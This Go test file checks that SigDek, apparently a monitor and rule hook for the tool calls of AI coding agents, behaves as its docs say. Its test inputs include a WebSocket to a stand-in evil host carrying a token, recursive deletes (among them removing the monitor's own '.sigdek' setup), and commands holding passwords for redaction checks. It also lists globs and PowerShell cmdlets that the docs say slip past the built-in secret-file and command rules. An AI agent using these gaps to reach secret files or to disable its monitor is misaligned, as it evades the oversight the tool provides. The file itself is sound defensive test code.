package adapter

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/tektonsoftware/sigdek/internal/event"
	"github.com/tektonsoftware/sigdek/internal/rules"
)

// What SECURITY.md, docs/rules.md and docs/recording.md say the hook does from 0.1.2, and the
// examples they give, checked against the hook's handling of real hook inputs (QA2-L4-4,
// QA2-L4-5). Each test first finds its sentences in the docs, so a change to either side fails
// until the two agree again.

// docSays fails unless every doc named has the phrase.
func docSays(t *testing.T, phrase string, docs ...string) {
	t.Helper()
	for _, rel := range docs {
		b, err := os.ReadFile(filepath.Join("..", "..", rel))
		if err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(strings.Join(strings.Fields(string(b)), " "), phrase) {
			t.Errorf("%s no longer says %q; update this test with the docs", rel, phrase)
		}
	}
}

// withRules is ctx() with the given rules in place of the usual set.
func withRules(rs ...rules.Rule) Context {
	c := ctx()
	c.Rules = rules.Set{Version: 1, Rules: rs}
	return c
}

// allBlock is the built-in rules, in their order, each set to Block.
func allBlock() []rules.Rule {
	set := rules.Defaults()
	for i := range set.Rules {
		set.Rules[i].Effect = rules.Deny
	}
	return set.Rules
}

func pre(dir, tool string, in map[string]any, c Context) Result {
	return ClaudeCode(payload(dir, "PreToolUse", map[string]any{"tool_name": tool, "tool_input": in}), c)
}

func post(dir, tool string, in map[string]any, c Context) Result {
	return ClaudeCode(payload(dir, "PostToolUse", map[string]any{"tool_name": tool, "tool_input": in}), c)
}

const (
	security  = "SECURITY.md"
	rulesDoc  = "docs/rules.md"
	recording = "docs/recording.md"
)

// SECURITY.md and docs/rules.md: command rules see Monitor, PowerShell and any other tool whose
// input is a command, MCP tools aside; the built-in rules don't catch PowerShell cmdlets; a
// Monitor call that watches a WebSocket is a web action.
func TestDocsCommandTools(t *testing.T) {
	docSays(t, "From 0.1.2 they also check commands sent through Claude Code's Monitor and PowerShell tools, or any other of its tools (MCP tools aside) whose input is a `command`, and these are recorded with their command like Bash commands.", security, rulesDoc)
	docSays(t, "so they don't catch PowerShell cmdlets such as `Remove-Item -Recurse`.", security, rulesDoc)
	docSays(t, "From 0.1.2, a Monitor call that watches a WebSocket (its `ws` input) instead of running a command is a web action: URL rules judge its address, and the record keeps the address with secrets stripped.", security, rulesDoc)

	dir := repo(t)
	block := withRules(rules.Rule{ID: "bbv", Effect: rules.Deny, Kinds: []string{"shell"}, Command: "*bbv-block-me*"})
	in := map[string]any{"command": "echo bbv-block-me"}
	for _, tool := range []string{"Bash", "Monitor", "PowerShell", "SomeFutureTool"} {
		res := pre(dir, tool, in, block)
		if !denied(t, res) || res.Record.Action.Kind != "shell" || res.Record.Action.Command != "echo bbv-block-me" {
			t.Errorf("%s: a command Block rule didn't stop it, or the record lacks the command: %+v", tool, res)
		}
	}
	if res := pre(dir, "mcp__runner__exec", in, block); res.Stdout != nil {
		t.Errorf("an MCP tool with a command met a command rule: %s", res.Stdout)
	}

	everything := withRules(allBlock()...)
	for _, c := range []string{"Remove-Item -Recurse -Force build", "Remove-Item -Recurse -Force .sigdek"} {
		if res := pre(dir, "PowerShell", map[string]any{"command": c}, everything); res.Stdout != nil {
			t.Errorf("the docs say the built-in rules don't catch %q, and one stopped it: %s", c, res.Stdout)
		}
	}

	// Claude Code sends ws as {"url": ..., "protocols": [...]} (QA3-REC-1); a string is read too.
	secret := "hvs." + strings.Repeat("Ws7k", 6)
	url := "wss://evil.example/feed?token=" + secret
	for _, ws := range []any{
		map[string]any{"url": url},
		map[string]any{"url": url, "protocols": []string{"graphql-ws"}},
		url,
	} {
		res := pre(dir, "Monitor", map[string]any{"ws": ws, "description": "d", "timeout_ms": 5000}, withRules(rules.Rule{ID: "url", Effect: rules.Deny, URL: "*evil.example*"}))
		if !denied(t, res) || res.Record.Action.Kind != "web" || !strings.HasPrefix(res.Record.Action.URL, "wss://evil.example/feed?token=") || strings.Contains(string(sealed(t, res.Record)), secret) {
			t.Errorf("Monitor ws %v: %+v", ws, res.Record)
		}
	}
}

// SECURITY.md and docs/rules.md: a Grep or Glob search is judged by its folder joined with its
// glob, and the session's folder stands in when it names none; the listed globs meet the
// built-in Secrets file rule and the listed ones get past it; a search with no glob is judged
// by its folder alone.
func TestDocsSearchGlobs(t *testing.T) {
	docSays(t, "From 0.1.2, a Grep or Glob search is also judged by its folder (the session's folder when it names none) joined with its glob, so a search with the glob `.env`, `**/.env`, `.env.*`, `*.pem` or `*.key` meets the built-in Secrets file rule.", security, rulesDoc)
	docSays(t, "A glob that reaches a secret file only through wildcards or braces, such as `.env*`, `id_*` or `{.env,.npmrc}`, can get past that rule, and a search with no glob is judged by its folder alone", security, rulesDoc)
	docSays(t, "Before 0.1.2, a search is judged by the folder it names, and one that names no folder meets no path rule.", security, rulesDoc)

	set := rules.Defaults()
	for i := range set.Rules {
		if set.Rules[i].ID == "secrets-file" {
			set.Rules[i].Effect = rules.Deny
		}
	}
	c := withRules(set.Rules...)
	dir := repo(t)
	blockedBy := func(res Result) string {
		if !denied(t, res) {
			return ""
		}
		return res.Record.Rule
	}
	for _, glob := range []string{".env", "**/.env", ".env.*", "*.pem", "*.key"} {
		for _, in := range []map[string]any{
			{"pattern": "API_SECRET", "glob": glob},
			{"pattern": "API_SECRET", "glob": glob, "path": dir},
			{"pattern": "API_SECRET", "glob": glob, "path": "."},
		} {
			if got := blockedBy(pre(dir, "Grep", in, c)); got != "secrets-file" {
				t.Errorf("the docs say Grep %v meets the Secrets file rule; stopped by %q", in, got)
			}
		}
		if got := blockedBy(pre(dir, "Glob", map[string]any{"pattern": glob}, c)); got != "secrets-file" {
			t.Errorf("the docs say Glob %s meets the Secrets file rule; stopped by %q", glob, got)
		}
	}
	for _, glob := range []string{".env*", "id_*", "{.env,.npmrc}"} {
		if res := pre(dir, "Grep", map[string]any{"pattern": "x", "glob": glob}, c); res.Stdout != nil {
			t.Errorf("the docs say Grep with the glob %s can get past the Secrets file rule; it was stopped", glob)
		}
	}
	if res := pre(dir, "Grep", map[string]any{"pattern": "API_SECRET"}, c); res.Stdout != nil {
		t.Errorf("a search with no glob is judged by its folder alone, and the repository is no secrets file: %s", res.Stdout)
	}
	if got := blockedBy(pre(dir, "Grep", map[string]any{"pattern": "x", "path": filepath.Join(dir, ".env")}, c)); got != "secrets-file" {
		t.Errorf("a search is judged by the path it names; Grep of .env stopped by %q", got)
	}

	// A search that names no folder is judged by the session's folder, with or without a glob.
	sub := filepath.Join(dir, "vault-dump")
	if err := os.MkdirAll(sub, 0o755); err != nil {
		t.Fatal(err)
	}
	folder := withRules(rules.Rule{ID: "no-dump", Effect: rules.Deny, Path: "vault-dump"})
	for _, in := range []map[string]any{{"pattern": "x"}, {"pattern": "x", "glob": "*.ts"}} {
		res := ClaudeCode(payload(sub, "PreToolUse", map[string]any{"tool_name": "Grep", "tool_input": in}), folder)
		if !denied(t, res) || !strings.HasPrefix(res.Record.Action.Path, "vault-dump") {
			t.Errorf("Grep %v from the session's folder vault-dump: %+v", in, res.Record)
		}
	}
}

// SECURITY.md and docs/recording.md: what redaction catches from 0.1.2, run through the hook as
// a finished Bash command.
func TestDocsRedaction(t *testing.T) {
	const caught = "passwords in variables named like `DB_PASS` or `MYSQL_PWD`, the value of a `*_KEY` variable when it looks generated, flags such as `--http-password`, the passwords given to `redis-cli -a` and `mongosh -p`, Vault tokens, and a long token used as a URL's user name."
	docSays(t, "From 0.1.2 it also catches "+caught, security)
	docSays(t, "From 0.1.2 also "+caught, recording)
	docSays(t, "Secrets in common formats are stripped from commands before anything is written (best effort).", "npm/sigdek/README.md")

	dir := repo(t)
	pass := "Zq7n3HRc" + strings.Repeat("p4Q", 3)
	key := "In9ntgkf" + strings.Repeat("Ab3", 8)
	vault := "hvs." + strings.Repeat("Vt5x", 6)
	hex := strings.Repeat("a1b2c3d4", 5)
	for _, c := range []struct{ command, secret string }{
		{"export DB_PASS=" + pass + " && npm start", pass},
		{"MYSQL_PWD=" + pass + " mysql -u root shop", pass},
		{"export SIGNING_KEY=" + key, key},
		{"wget --http-password " + pass + " https://files.example.com/f", pass},
		{"redis-cli -h cache.example.com -a " + pass + " ping", pass},
		{"mongosh mongodb://db.example.com -u admin -p " + pass, pass},
		{"vault login " + vault, vault},
		{"git clone https://" + hex + "@github.com/larkspur-labs-example/api.git", hex},
	} {
		res := post(dir, "Bash", map[string]any{"command": c.command}, ctx())
		if line := sealed(t, res.Record); strings.Contains(string(line), c.secret) || res.Record.Redactions == 0 {
			t.Errorf("the docs say this is stripped: %s", line)
		}
	}
	// "when it looks generated": a *_KEY holding a name is left as it is.
	for _, c := range []string{"export SORT_KEY=name", "export SSH_KEY=~/.ssh/id_ed25519"} {
		if res := post(dir, "Bash", map[string]any{"command": c}, ctx()); res.Record.Action.Command != c || res.Record.Redactions != 0 {
			t.Errorf("%q was changed: %+v", c, res.Record.Action)
		}
	}
}

// docs/rules.md: which rule a record carries (QA2-L4-2). The built-in rules come first, in
// default-rules.json's order; a record carries the Block rule that stopped its action or the
// first Flag rule it matches; a change to SigDek's own setup makes an Attempted record with the
// setup rule and a second record with its result.
func TestDocsWhichRuleARecordCarries(t *testing.T) {
	docSays(t, "Each record carries at most one rule. A blocked action's record carries the Block rule that stopped it; any other record carries the first Flag rule it matches, in the order the team's rules are listed: the built-in rules first, in the order of [default-rules.json](../schema/default-rules.json), then the team's own in the order they were added.", rulesDoc)
	docSays(t, "A change to SigDek's own setup makes two records: one marked Attempted before it runs, carrying the sigdek-setup rule it matches, and, when a hook runs after it, one with its result. So a report counts that action twice: a report counts records, not actions.", rulesDoc)

	// Signed out, the built-in rules are tried in default-rules.json's order.
	b, err := os.ReadFile(filepath.Join("..", "..", "schema", "default-rules.json"))
	if err != nil {
		t.Fatal(err)
	}
	var file struct{ Rules []struct{ ID string } }
	if err := json.Unmarshal(b, &file); err != nil {
		t.Fatal(err)
	}
	defaults := rules.Defaults().Rules
	if len(defaults) != len(file.Rules) {
		t.Fatalf("%d built-in rules, %d in default-rules.json", len(defaults), len(file.Rules))
	}
	for i := range defaults {
		if defaults[i].ID != file.Rules[i].ID {
			t.Fatalf("built-in rule %d is %s, default-rules.json has %s", i, defaults[i].ID, file.Rules[i].ID)
		}
	}

	dir := repo(t)
	team := rules.Defaults()
	team.Rules = append(team.Rules,
		rules.Rule{ID: "team-rm", Effect: rules.Flag, Kinds: []string{"shell"}, Command: "rm -rf*"},
		rules.Rule{ID: "team-psql", Effect: rules.Flag, Kinds: []string{"shell"}, Command: "psql*prod*"})
	c := withRules(team.Rules...)
	ran := func(cmd string, c Context) string {
		return post(dir, "Bash", map[string]any{"command": cmd}, c).Record.Rule
	}
	if got := ran("rm -rf build", c); got != "recursive-delete" {
		t.Errorf("a built-in rule and a team Flag rule both match; the record carries %q", got)
	}
	if got := ran("psql -h prod.db.example", c); got != "team-psql" {
		t.Errorf("only the team's rule matches; the record carries %q", got)
	}

	// A setup change: Attempted with the setup rule, then the result, with the built-in order.
	setup := map[string]any{"command": "rm -rf .sigdek"}
	if res := pre(dir, "Bash", setup, c); res.Record == nil || res.Record.Outcome != "attempted" || res.Record.Rule != "sigdek-setup-shell" {
		t.Fatalf("attempted record: %+v", res.Record)
	}
	if res := post(dir, "Bash", setup, c); res.Record.Outcome != "ran" || res.Record.Rule != "sigdek-setup-shell" {
		t.Errorf("result record: %+v", res.Record)
	}
	// The Attempted record carries the setup rule even when another Flag rule comes first.
	privilegeFirst := withRules(append([]rules.Rule{{ID: "privilege-first", Effect: rules.Flag, Kinds: []string{"shell"}, Command: "sudo *"}}, team.Rules...)...)
	sudo := map[string]any{"command": "sudo rm -rf .sigdek"}
	if res := pre(dir, "Bash", sudo, privilegeFirst); res.Record == nil || res.Record.Rule != "sigdek-setup-shell" {
		t.Errorf("attempted record: %+v", res.Record)
	}
	if got := post(dir, "Bash", sudo, privilegeFirst).Record.Rule; got != "privilege-first" {
		t.Errorf("result record carries %q, want the first Flag rule", got)
	}

	// Blocked: the record carries the Block rule that stopped it, the first in the list.
	blockBoth := withRules(append(allBlock(), rules.Rule{ID: "team-no-rm", Effect: rules.Deny, Kinds: []string{"shell"}, Command: "rm -rf*"})...)
	if res := pre(dir, "Bash", map[string]any{"command": "rm -rf build"}, blockBoth); !denied(t, res) || res.Record.Rule != "recursive-delete" {
		t.Errorf("blocked record: %+v", res.Record)
	}
}

// docs/rules.md: how Claude Code names MCP servers, from the tool names it sends, and what a
// pattern matches in Cursor, which names no server (QA2-L4-5).
func TestDocsMCPNames(t *testing.T) {
	docSays(t, "Claude Code names a claude.ai connector's server `claude_ai_<Name>`, such as `claude_ai_GitHub`, and a plugin's server `plugin_<plugin>_<server>`, so `github/merge_*` misses their tools. `*/merge_*` matches the tool on any server, and `re:(?i)github/merge_` matches all three names.", rulesDoc)
	docSays(t, "so for Cursor an MCP pattern like `github/merge_*` matches on the tool part. A `re:` pattern sees `/<tool>` there, so `re:(?i)github/merge_` misses Cursor's call, and `*/merge_*` is the form that matches it in both agents.", rulesDoc)

	dir := repo(t)
	names := []string{"mcp__github__merge_pull_request", "mcp__claude_ai_GitHub__merge_pull_request", "mcp__plugin_github_github__merge_pull_request"}
	servers := []string{"github", "claude_ai_GitHub", "plugin_github_github"}
	for i, name := range names {
		if a := claudeCodeAction(name, nil, dir); a.Kind != "mcp" || a.MCP == nil || *a.MCP != (event.MCP{Server: servers[i], Tool: "merge_pull_request"}) {
			t.Errorf("%s parses to %+v", name, a.MCP)
		}
	}
	stops := func(pattern, name string) bool {
		return denied(t, pre(dir, name, map[string]any{"pull_number": 7}, withRules(rules.Rule{ID: "no-merge", Effect: rules.Deny, MCP: pattern})))
	}
	for i, name := range names {
		if got := stops("github/merge_*", name); got != (i == 0) {
			t.Errorf("github/merge_* on %s: stopped %v", name, got)
		}
		for _, p := range []string{"*/merge_*", "re:(?i)github/merge_"} {
			if !stops(p, name) {
				t.Errorf("the docs say %s matches %s", p, name)
			}
		}
	}

	cursorStops := func(pattern string) bool {
		res := Cursor(cursorPayloadJSON(dir, "preToolUse", map[string]any{"tool_name": "MCP:merge_pull_request", "tool_input": map[string]any{"pull_number": 7}, "cwd": dir}),
			withRules(rules.Rule{ID: "no-merge", Effect: rules.Deny, MCP: pattern}), "")
		return strings.Contains(string(res.Stdout), `"permission":"deny"`)
	}
	for p, want := range map[string]bool{"github/merge_*": true, "*/merge_*": true, "re:(?i)github/merge_": false} {
		if got := cursorStops(p); got != want {
			t.Errorf("Cursor, %s: stopped %v, the docs say %v", p, got, want)
		}
	}
}
